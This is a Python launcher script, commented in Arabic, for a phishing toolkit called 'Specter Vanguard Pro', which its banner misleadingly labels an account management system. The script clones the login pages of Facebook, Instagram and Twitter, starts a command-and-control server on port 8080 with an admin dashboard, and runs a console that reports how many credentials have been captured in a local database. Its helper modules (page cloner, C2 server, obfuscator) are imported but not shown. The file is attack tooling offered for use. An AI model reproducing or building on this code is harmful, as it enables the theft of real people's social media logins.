#!/usr/bin/env python3
# Specter Vanguard Pro - Main Execution File
# النسخة المحسنة والمطورة

import sys
import time
import threading
import signal
from datetime import datetime

# استيراد المكونات المحسنة
from core.config_loader import AdvancedConfig
from phishing_engine.page_cloner import AdvancedPageCloner
from command_control.c2_server import run_c2_server, AdvancedC2Server
from utilities.obfuscator import AdvancedObfuscator

# متغيرات عامة
start_time = time.time()
system_active = True

def signal_handler(sig, frame):
    """معالج إشارات الإغلاق"""
    global system_active
    print("\n[*] Received shutdown signal. Cleaning up...")
    system_active = False
    sys.exit(0)

def display_banner():
    """عرض لافتة النظام"""
    banner = """
    ╔══════════════════════════════════════════════════════════╗
    ║    ███████╗██████╗ ███████╗ ██████╗████████╗███████╗██████╗    ║
    ║    ██╔════╝██╔══██╗██╔════╝██╔════╝╚══██╔══╝██╔════╝██╔══██╗   ║
    ║    ███████╗██████╔╝█████╗  ██║        ██║   █████╗  ██████╔╝   ║
    ║    ╚════██║██╔═══╝ ██╔══╝  ██║        ██║   ██╔══╝  ██╔══██╗   ║
    ║    ███████║██║     ███████╗╚██████╗   ██║   ███████╗██║  ██║   ║
    ║    ╚══════╝╚═╝     ╚══════╝ ╚═════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝   ║
    ║                                                              ║
    ║                 SPECTER VANGUARD PRO v3.0                    ║
    ║           Advanced Account Management System                 ║
    ╚══════════════════════════════════════════════════════════╝
    """
    print(banner)

def system_monitor():
    """مراقب أداء النظام"""
    while system_active:
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        uptime = int(time.time() - start_time)
        
        print(f"\n[{current_time}] System Status:")
        print(f"  Uptime: {uptime} seconds")
        print(f"  Memory Usage: Monitoring...")
        print(f"  Active Threads: {threading.active_count()}")
        print("-" * 50)
        
        time.sleep(30)  # تحديث كل 30 ثانية

def main():
    """الدالة الرئيسية"""
    # تعيين معالج الإشارات
    signal.signal(signal.SIGINT, signal_handler)
    
    # عرض اللافتة
    display_banner()
    
    # تهيئة المكونات
    print("[*] Initializing Advanced Components...")
    
    # 1. تحميل الإعدادات
    config = AdvancedConfig()
    print(f"  ✓ Loaded config: {config.get('system', 'name')} v{config.get('system', 'version')}")
    
    # 2. تهيئة مشوش الشفرة
    obfuscator = AdvancedObfuscator()
    print("  ✓ Advanced obfuscator initialized")
    
    # 3. تهيئة مستنسخ الصفحات
    cloner = AdvancedPageCloner(config)
    print("  ✓ Advanced page cloner ready")
    
    # 4. تهيئة خادم C2
    c2_server = AdvancedC2Server()
    print("  ✓ C2 database initialized")
    
    # 5. استنساخ الصفحة المستهدفة
    print("\n[*] Cloning target pages...")
    targets = [
        "https://www.facebook.com",
        "https://www.instagram.com",
        "https://www.twitter.com"
    ]
    
    for target in targets:
        result = cloner.clone_advanced(target)
        if result['success']:
            print(f"  ✓ Cloned: {target} -> {result['filename']}")
        else:
            print(f"  ✗ Failed: {target} - {result['error']}")
    
    # 6. بدء خادم C2 في thread منفصل
    print("\n[*] Starting C2 Server...")
    server_thread = threading.Thread(target=run_c2_server, daemon=True)
    server_thread.start()
    print("  ✓ C2 Server running on http://0.0.0.0:8080")
    print("  ✓ Admin dashboard: http://localhost:8080/admin/dashboard")
    
    # 7. بدء مراقب النظام
    print("\n[*] Starting system monitor...")
    monitor_thread = threading.Thread(target=system_monitor, daemon=True)
    monitor_thread.start()
    
    # 8. معلومات التشغيل
    print("\n" + "="*60)
    print("SYSTEM OPERATIONAL")
    print("="*60)
    print("Commands:")
    print("  status    - Show system status")
    print("  targets   - List cloned targets")
    print("  stats     - Show capture statistics")
    print("  exit      - Shutdown system")
    print("="*60)
    
    # 9. وحدة التحكم التفاعلية
    try:
        while system_active:
            cmd = input("\nspecter> ").strip().lower()
            
            if cmd == "status":
                print(f"System Status: ACTIVE")
                print(f"Uptime: {int(time.time() - start_time)}s")
                print(f"Threads: {threading.active_count()}")
                print(f"Config Mode: {config.get('system', 'mode')}")
                
            elif cmd == "targets":
                import os
                template_dir = "data/templates"
                if os.path.exists(template_dir):
                    files = os.listdir(template_dir)
                    if files:
                        for f in files:
                            print(f"  - {f}")
                    else:
                        print("No cloned templates found")
                else:
                    print("Template directory not found")
                    
            elif cmd == "stats":
                import sqlite3
                conn = sqlite3.connect("data/credentials.db")
                cursor = conn.cursor()
                cursor.execute("SELECT COUNT(*) FROM credentials")
                count = cursor.fetchone()[0]
                conn.close()
                print(f"Credentials captured: {count}")
                
            elif cmd in ["exit", "quit"]:
                print("[*] Shutting down Specter Vanguard Pro...")
                system_active = False
                break
                
            elif cmd == "help":
                print("Available commands: status, targets, stats, exit, help")
                
            else:
                print(f"Unknown command: {cmd}")
                print("Type 'help' for available commands")
                
    except KeyboardInterrupt:
        print("\n[*] Manual shutdown initiated")
    finally:
        print("\n[*] Specter Vanguard Pro shutdown complete")
        print(f"[*] Total runtime: {int(time.time() - start_time)} seconds")

if __name__ == "__main__":
    main()
